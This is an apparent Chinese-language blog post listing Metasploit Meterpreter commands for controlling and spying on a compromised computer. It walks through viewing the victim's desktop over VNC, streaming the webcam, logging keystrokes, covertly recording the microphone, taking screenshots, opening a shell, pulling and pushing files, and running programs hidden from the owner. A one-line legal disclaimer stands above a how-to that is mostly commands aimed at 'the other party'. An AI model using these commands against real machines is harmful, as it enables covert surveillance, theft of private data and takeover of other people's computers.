---
layout: post
title: '在Msf黑电脑的专用命令'
subtitle: 'Metasploit'
tags: linux 命令 shell
keywords: Msf Metasploit shell 黑电脑 专用
cover: https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/MsfCmd/cover.jpg
---

当你进入Meterpreter命令行后，你就可以使用这些命令了。  
**警告：当你执行这些命令时，你需要想过有关国家法律的东西。你不能随意的攻击别人的电脑，你只能供学习使用。**

### 使用vnc查看桌面
VNC是一种远程连接的类型。就好似TeamViewer。但是，两者间不同的点是:VNC的基础是搭在Linux上的，是使用IP地址进行连接的类型，而控制也比较流畅TeamViewer的基础是搭在Windows的，是使用ID号进行连接的类型，而控制会有些一卡一卡的。  
但是，Metasploit的基础是搭在Linux上的。所以Metasploit选用了VNC连接。
```msf
run vnc
```
### 监视摄像头
运行此命令后，你会发现`/home/root`目录生成了一个`乱码.html`的文件。打开此文件后，会看到对方的摄像头的内容。
```msf
webcam_stream
```
### 监视键盘按下内容  
执行此命令后，可以看到对方正在打什么字。如果你要查看对方打什么，先输入
```msf
keyscan_start
```
来开启键盘记录功能。  
随后，显示键盘输入什么，请输入
```msf
keyscan_dump
```
如果你看够了，输入这条命令来结束。
```msf
keyscan_stop
```
### 录制声音
这又是一个很有趣的命令了。但是，这个命令仅支持安装了麦克风的电脑。  
这种电脑大多数是笔记本、手提电脑。  
如果你要窃听对方的电脑麦克风`x`秒，你可以输入
```msf
record -d x
```
这里面的x改为你要窃听的秒数。   
  
另外，你如果想从输入命令后起就窃听，这就有点不太行了。。  
好吧，下面这个命令是从输入命令之后开始窃听**直到按下`Ctrl`+`C`** 。  
```msf
record_mic
```
### 截屏
他会告诉你保存到哪里的，不过保存下载的截屏文件名也是乱码。
```msf
screenshot
```
### 进入cmd
入侵不同的系统有不同的命令行。比如入侵Windows就是进入cmd，入侵Linux就是进入bash。
```msf
shell
```
### 从目标机器下载东西
有点和上面的一样。但是Windows有盘符，而Linux没有盘符。所以如果你想要在Windows下载一些资料的话，要确认那个放资料的盘符，然后每进入一个目录输入两条`\`。
```msf
download C:\\path\\to\\file
```
上面的`C:\\path\\to\\file`可以改成你要下载的文件所在。  
  
如果是Linux，就更简单：
```msf
download /mnt/secretfolder/x
```
上面的`/mnt/secret/x`可以改成你要下载的文件所在。

### 从kali上传内容到目标机器
这又有点不同了。这次是要上传，所以要按照`upload 本地文件 上传的目录`的格式填写。就比如我的账户`root`账号里有一个叫做x的文件，我要这样写：
```msf
upload /home/root/x C:\\path\\for\\upload
```
`/home/root/x`可以改成你的文件所在，`C:\\path\\for\\upload`可以改成你要上传到的目录。  
当然，改成Linux的话也是一样：
```msf
upload /home/root/x /home/user/desktop
```
`/home/root/x`改成你的文件所在，`/home/user/desktop`改成要上传到的目录下。

### 查看有几个摄像头
这个命令可以先“概览”一下这台机器有没有摄像头。比如说你要攻击安卓，万一安卓机器是装在台式机上的，且没配备摄像头，这就不好说了吧。。  
如果你知道你是在攻击手提电脑Windows或其他，这就变成了装逼_的命令。
```msf
webcam_list
```

### 运行程序
如果你是运行在Windows下，这就比较好了。因为Windows在“运行程序”可以不需要带目录_。但是在Linux就说不定了，就要带目录。
```msf
execute -f 文件名
```
如果想要打开应用而不被机主发现打开了程序，可以加`-H`参数，隐秘的打开。
```msf
execute -f -H 文件名
```
如果想要交互式的打开而又不要机主发现，加`-i`参数咯。  
*(当是在Windows的环境下输入是cmd的话，有惊喜！)*
```msf
execute -i -f -H 文件名
```
